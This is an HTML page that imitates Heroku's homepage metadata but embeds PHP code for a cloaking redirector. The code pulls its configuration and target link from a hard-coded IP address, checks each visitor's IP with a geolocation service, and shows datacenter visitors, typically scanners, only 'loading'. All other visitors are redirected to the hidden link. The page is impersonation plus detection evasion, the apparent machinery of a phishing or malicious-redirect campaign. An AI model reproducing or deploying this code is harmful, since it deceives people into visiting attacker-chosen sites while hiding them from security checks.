
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge;">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="alternate" href="https://www.heroku.com/" hreflang="en">
    <link rel="alternate" href="https://jp.heroku.com/" hreflang="ja">


    <title>Cloud Application Platform | Heroku man</title>
    <meta property="og:title" content="Cloud Application Platform | Heroku">

      <meta name="description" content="Heroku is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud.">
      <meta property="og:description" content="Heroku is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud.">

      <meta property="og:image" content="https://www.herokucdn.com/images/og.png">
      <meta property="og:image:width" content="1200">
      <meta property="og:image:height" content="630">

      <meta name="google-site-verification" content="V8eEvIkb6RQqJca9Wf-o9baurAQMe54VKxd06IeaFeg">

      <meta name="slack-app-id" content="A1QME020P">

    

    <link rel="shortcut icon" type="image/x-icon" href="https://www.herokucdn.com/favicon.ico">

      <link rel="stylesheet" media="all" href="https://www2.assets.heroku.com/assets/application-cad4ee5776697097e248910d02da3542947dc24d4075b4f6c17e848040fc52b8.css">

    <link rel="canonical" href="https://www.heroku.com/">

    <meta name="csrf-param" content="authenticity_token">
</head>
<html>
    <body>
      <div id="contact" class="form-1">
          <div class="container-fluid">
              <div class="">
                  <div class="col-xl-12">
                      <div class="form-container">
                          <p class="center">
                          <?php
                          $url = $_SERVER['REQUEST_URI'];
                          $ipaddress = $_SERVER['REMOTE_ADDR'];
                          $url_components = parse_url($url);
                          parse_str($url_components['query'], $params);
                          $cloakjson = file_get_contents('http://66.59.199.128/json/'.$params['t'].'?e='.$params['e'].'&p='.$params['p'].'&f='.$params['f'].'');
                          $cloakjsons = json_decode($cloakjson);


                          $ip2loation = file_get_contents('https://api.ip2location.com/v2/?ip=' . $ipaddress . '&key=' . $cloakjsons->api . '&package=WS23');
                          $ip2loations = json_decode($ip2loation);
                          if ($ip2loations->usage_type == "DCH"){
                            print_r('loading');
                          }else{
                            $url = $cloakjsons->links;
                            header("Location:$url");
                            print_r($url);
                          }
                          
                          ?>
                          </p>
                      </div> 
                  </div>
              </div>
          </div>
      </div>  
  </body>
</html>
